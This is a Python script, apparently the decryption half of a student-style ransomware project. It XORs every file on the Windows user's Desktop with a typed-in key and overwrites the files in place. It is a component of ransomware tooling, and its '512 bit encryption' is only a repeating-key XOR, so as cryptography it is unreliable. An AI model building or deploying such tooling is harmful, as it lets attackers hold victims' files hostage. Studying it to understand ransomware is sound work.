import os # interact with OS
import threading
import queue


# asks for 512 bit key to decrypt all files

def decrypt(key): #function to unscramble
    while True:
        file_path = q.get() # retrives file from queue
        try:
            with open(file_path, "rb") as f:
                data = f.read()
                #Opens the file in Read Binary mode to access the raw encrypted bytes.
                #Reads the entire encrypted content into memory.

            key_len = len(key)
            processed_data = bytes([data[i] ^ ord(key[i % key_len]) for i in range(len(data))])
            # This is the XOR reversal logic. XOR is symmetric; if you apply the same key to the
            # encrypted data, it returns the original data.


            with open(file_path, "wb") as f:
                f.write(processed_data)
            #Opens the file in Write Binary mode and overwrites the encrypted
            # "garbage" with the restored data.
            print(f"Successfully Decrypted {file_path}")
        except Exception as e:
            print(f"Failed to Decrypt {file_path}: {e}")
        q.task_done()
        #Signals to the queue that the specific file has been successfully processed.

# encryption info
ENCRYPT_LEVEL = 512//8 # 512 bit encryption 64 bites

key_char_pool = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()?<>./;[]{}|"
key_char_pool_length = len(key_char_pool)

# file paths to decrypt
print("Preparing files")

desktop_path = os.environ["USERPROFILE"] + "\\Desktop"
files = os.listdir(desktop_path)
#Dynamically locates the path to the current user's Desktop on a Windows machine.
#Generates a list of every item found on the Desktop.
abs_files = []
for file in files:
    if os.path.isfile(f"{desktop_path}\\{file}"):
        abs_files.append(f"{desktop_path}\\{file}")
        #Stores the absolute path of each target file so the threads
        # know exactly where to find them.
print("Sucessfully located all files")

# key check
key = input("Please enter key to decrypt files: ")
#Pauses the script and waits for the user to provide the 64-character decryption key.

q = queue.Queue()
#Initializes the synchronized "bucket" for file paths.
for f_path in abs_files: # Add this loop!
    q.put(f_path)
#Feeds every file path identified on the Desktop into the queue.

for i in range(30): # Start a few worker threads
    t = threading.Thread(target=decrypt, args=(key,), daemon=True)
    t.start()
#Creates a thread that will run the decrypt function using the provided key.
# daemon=True means these threads will shut down automatically when the main
# program exits.
q.join() #Tells the main program to wait here untill finished
print("Sucessfully decrypted files")


